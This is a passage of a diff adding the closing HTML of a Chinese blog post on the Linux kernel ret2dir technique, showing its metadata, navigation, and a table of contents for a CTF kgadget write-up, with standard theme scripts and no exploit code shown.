+        <li><strong>标题:</strong> [Linux-Kernel-PWN] ret2dir &amp;&amp; pt_regs</li>
+        <li><strong>作者:</strong> HackC0der</li>
+        <li><strong>创建于
+                :</strong> 2026-03-18 08:48:40</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-03-19 07:57:48
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://hackc0der.github.io/2026/03/18/Linux-Kernel-PWN（五）ret2dir/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux-Kernel-PWN/">#Linux Kernel PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/03/19/Linux-Kernel-PWN-Tricks/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">[Linux-Kernel-PWN] 技巧札记</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/03/16/Claude%20Code/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Claude Code 使用笔记</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">[Linux-Kernel-PWN] ret2dir &amp;&amp; pt_regs</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81direct-mapping-of-all-phys-memory"><span class="nav-text">一、direct mapping of all phys memory</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-text-mapping"><span class="nav-text">kernel text mapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#direct-mapping-of-all-phys-memory"><span class="nav-text">direct mapping of all phys memory</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ret2dir%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">二、ret2dir利用原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%BF%E6%80%A7%E6%98%A0%E5%B0%84%E5%8C%BA"><span class="nav-text">线性映射区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%96%B7"><span class="nav-text">堆喷</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%9AMINI-LCTF2022-kgadget"><span class="nav-text">三、例题：MINI-LCTF2022-kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-text">文件分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kgadget-ko%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90"><span class="nav-text">kgadget.ko驱动分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gadgets"><span class="nav-text">gadgets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%90%E8%BF%9B%E6%9E%84%E9%80%A0ROP-physmap-spray"><span class="nav-text">渐进构造ROP + physmap spray</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp%E4%B8%8E%E6%89%A7%E8%A1%8C"><span class="nav-text">完整exp与执行</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">HackC0der</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 11 篇文章
+                    </span>
+                    
+                        <span>
+                            共 63.9k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
